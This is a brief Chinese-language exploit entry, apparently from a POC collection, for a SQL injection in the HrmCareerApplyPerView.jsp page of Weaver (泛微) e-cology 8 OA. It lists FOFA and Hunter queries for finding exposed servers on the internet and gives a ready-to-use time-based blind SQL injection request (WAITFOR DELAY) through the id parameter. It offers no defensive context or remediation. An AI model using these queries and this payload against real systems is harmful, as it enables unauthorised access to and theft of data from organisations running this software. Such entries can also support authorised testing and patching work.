# 泛微OA E-cology 8 HrmCareerApplyPerView.jsp SQL注入漏洞

## 网络测绘

fofa: app="泛微-OA（e-cology）" && body="ecology8"

hunter: app.name="泛微 e-cology OA"&&web.body="ecology8"

## POC / EXP

```
/pweb/careerapply/HrmCareerApplyPerView.jsp?id=1 WAITFOR DELAY '0:0:5'
```